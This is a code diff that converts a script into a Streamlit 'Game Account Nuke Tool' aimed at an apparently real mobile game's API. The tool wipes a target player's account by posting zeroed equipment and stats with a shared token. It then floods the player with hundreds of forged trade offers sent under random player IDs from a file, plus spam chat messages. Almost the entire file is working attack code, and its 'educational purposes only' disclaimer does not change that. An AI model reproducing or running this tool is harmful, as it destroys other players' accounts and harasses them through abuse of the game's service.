@@ -1,39 +1,64 @@
+import streamlit as st
 import requests
 import random
 from concurrent.futures import ThreadPoolExecutor
+import time
 
 PRICESHASH = "fbd9aec4384456124c0765581a4ba099"
 
-def nuke(iD, mesa, tradesCount: int, channel="US"):
-    def send_message(id, text, channel):
+if 'is_running' not in st.session_state:
+    st.session_state.is_running = False
+if 'stop_flag' not in st.session_state:
+    st.session_state.stop_flag = False
+
+def load_ids():
+    try:
+        with open("Allids.txt", "r") as file:
+            ids = []
+            for line in file:
+                line = line.strip()
+                if line and not line.startswith('Player IDs') and not line.startswith('✓') and not line.startswith('Sent'):
+                    ids.append(line)
+        return ids
+    except FileNotFoundError:
+        st.error("Allids.txt file not found!")
+        return []
+
+def send_message(id, text, channel):
+    try:
         req = "https://api.efezgames.com/v1/social/sendChat?playerID={ID}&token={token}&message={msg}&chan={chan}"
-        request = req.format(ID=id,
-                             token="01122",
-                             msg=text,
-                             chan=channel)
-        response = requests.get(request)
-        print(response.text)
+        request = req.format(ID=id, token="01122", msg=text, chan=channel)
+        response = requests.get(request, timeout=10)
+        return response.json()
+    except Exception as e:
+        return None
 
-    message_text = mesa
-    target = iD
-    ids = []
+def clear_acc(target_id):
+    try:
+        req = "https://api.efezgames.com/v1/equipment/sendEQ"
+        myobj = {
+            "playerID": target_id,
+            "version": "hui",
+            "data": "0;0;0;0;0;0;0;0;0;0;0",
+            "eqdata": "0"*32,
+            "stats": "1:0,2:0,3:0,4:0,5:0,6:0.00,7:0.00,8:0,9:0,11:0,13:0,15:0.00,16:0.00,17:0.00,18:0,19:0,20:0,23:0,24:0,25:0,27:0,28:0,30:0,31:0,33:0,34:0,36:0,38:0,39:0,40:0,41:0,42:0",
+            "blockedUsers": target_id,
+            "description": "<color=red><size=100>rip",
+            "token": "01122",
+        }
+        response = requests.post(url=req, data=myobj, timeout=10)
+        return response.text
+    except Exception as e:
+        return None
 
-    with open("Allids.txt", "r") as file:
-        for line in file:
-            line = line.strip()
-            if line and not line.startswith('Player IDs') and not line.startswith('✓') and not line.startswith('Sent'):
-                ids.append(line)
-
-    print(f"Loaded {len(ids)} IDs from Allids.txt")
-    send_message(target, "Bamboozle", channel)
-
-    def trades(sender_id, receiver_id, m):
-        msg = "<size=100><voffset=100><pos=0><color=red>" + message_text[m]
-
+def create_trade(sender_id, receiver_id, message_text, message_index):
+    try:
+        msg = "<size=100><voffset=100><pos=0><color=red>" + message_text[message_index]
+        
         skin = "HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00"
-
+        
         req = "https://api.efezgames.com/v1/trades/createOffer?token={TOKEN}&playerID={PLAYERID}&receiverID={RECEIVERID}&senderNick={SENDERNICK}&senderFrame={SENDERFRAME}&senderAvatar={SENDERAVATAR}&receiverNick={RECEIVERNICK}&receiverFrame={RECEIVERFRAME}&receiverAvatar={RECEIVERAVATAR}&skinsOffered={SKINSOFFERED}&skinsRequested={SKINSREQUESTED}&message={MESSAGE}&pricesHash={PRICESHASH}&senderOneSignal=a27b79ec-f206-4022-b12f-260855743091&receiverOneSignal=1621a4af-03a2-4fcf-976c-d68c021460c8&senderVersion=2.31.0&receiverVersion=2.31.0"
-
+        
         request = req.format(TOKEN="01122",
                              PLAYERID=sender_id,
                              RECEIVERID=receiver_id,
@@ -47,53 +72,106 @@ def nuke(iD, mesa, tradesCount: int, channel="US"):
                              SKINSREQUESTED=skin,
                              PRICESHASH=PRICESHASH,
                              MESSAGE=msg)
-        response = requests.get(request)
-        return response
+        response = requests.get(request, timeout=10)
+        return response.json()
+    except Exception:
+        return {"success": False}
 
-    def clearAcc(targetId):
-        req = "https://api.efezgames.com/v1/equipment/sendEQ"
-        myobj = {
-            "playerID": targetId,
-            "version": "hui",
-            "data": "0;0;0;0;0;0;0;0;0;0;0",
-            "eqdata": "0"*32,
-            "stats": "1:0,2:0,3:0,4:0,5:0,6:0.00,7:0.00,8:0,9:0,11:0,13:0,15:0.00,16:0.00,17:0.00,18:0,19:0,20:0,23:0,24:0,25:0,27:0,28:0,30:0,31:0,33:0,34:0,36:0,38:0,39:0,40:0,41:0,42:0",
-            "blockedUsers": targetId,
-            "description": "<color=red><size=100>rip",
-            "token": "01122",
-        }
-        r = requests.post(url=req, data=myobj)
-        print(r.text)
-
-    clearAcc(target)
-
+def run_nuke(target_id, trades_count, channel, progress_bar, status_text):
+    st.session_state.is_running = True
+    st.session_state.stop_flag = False
+    
+    ids = load_ids()
+    if not ids:
+        st.session_state.is_running = False
+        return
+    
+    status_text.text(f"Loaded {len(ids)} IDs")
+    progress_bar.progress(0)
+    
+    send_message(target_id, "Bamboozle", channel)
+    clear_acc(target_id)
+    
     successful_trades = 0
-
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for i in range(tradesCount):
+    total_attempts = trades_count
+    
+    for batch in range(trades_count):
+        if st.session_state.stop_flag:
+            status_text.text("Stopped by user")
+            break
+            
+        progress = (batch + 1) / trades_count
+        progress_bar.progress(progress)
+        status_text.text(f"Batch {batch + 1}/{trades_count} - Success: {successful_trades}")
+        
+        with ThreadPoolExecutor(max_workers=10) as executor:
             futures = []
             for j in range(10):
                 random_id = random.choice(ids)
-                futures.append(executor.submit(trades, random_id, target, j % len(message_text)))
-
+                futures.append(executor.submit(create_trade, random_id, target_id, ["rip"] * 10, 0))
+            
             for future in futures:
                 try:
-                    response = future.result()
-                    print(response.text)
-                    if response.json().get("success", False):
+                    response = future.result(timeout=15)
+                    if response.get("success", False):
                         successful_trades += 1
-                    else:
-                        print("Trade failed, retrying...")
-                except Exception as e:
-                    print(f"An error occurred: {e}")
+                except Exception:
+                    pass
+        
+        time.sleep(0.5)
+    
+    clear_acc(target_id)
+    send_message(target_id, "rip", channel)
+    
+    status_text.text(f"Completed! {successful_trades} successful trades")
+    progress_bar.progress(1.0)
+    st.session_state.is_running = False
 
-    print(str(successful_trades) + " successful trades!")
-    clearAcc(target)
-    send_message(target, "rip", channel)
+st.set_page_config(page_title="Game Nuke Tool", page_icon="💣", layout="wide")
 
-target = input("Type nuke target ID: ")
-count = int(input("Type number of trades: "))
-channel_input = input("Type channel to send nuke results (can be skipped, default US): ")
-channel = channel_input if channel_input else "US"
+st.title("💣 Game Account Nuke Tool")
+st.markdown("---")
 
-nuke(target, "rip", count // 10, channel)
+st.warning("⚠️ **DISCLAIMER**: For educational purposes only. Use at your own risk.")
+
+col1, col2 = st.columns(2)
+
+with col1:
+    target_id = st.text_input("🎯 Target Player ID", placeholder="Enter player ID...")
+    trades_batches = st.number_input("📊 Trade Batches", min_value=1, max_value=100, value=10)
+
+with col2:
+    channel = st.selectbox("📢 Channel", ["US", "EU", "ASIA"], index=0)
+    total_trades = trades_batches * 10
+    st.info(f"**Total trades:** {total_trades}")
+
+st.markdown("---")
+
+status_text = st.empty()
+progress_bar = st.progress(0)
+
+col1, col2 = st.columns(2)
+
+with col1:
+    start_button = st.button("🚀 Start Nuke", type="primary", disabled=st.session_state.is_running)
+
+with col2:
+    stop_button = st.button("🛑 Stop Nuke", disabled=not st.session_state.is_running)
+
+if start_button:
+    if not target_id:
+        st.error("Please enter a target player ID!")
+    else:
+        try:
+            run_nuke(target_id, trades_batches, channel, progress_bar, status_text)
+            st.success("Nuke completed!")
+        except Exception as e:
+            st.error(f"Error: {e}")
+            st.session_state.is_running = False
+
+if stop_button:
+    st.session_state.stop_flag = True
+    st.warning("Stopping...")
+
+st.markdown("---")
+st.markdown("*Make sure Allids.txt is in the same directory*")
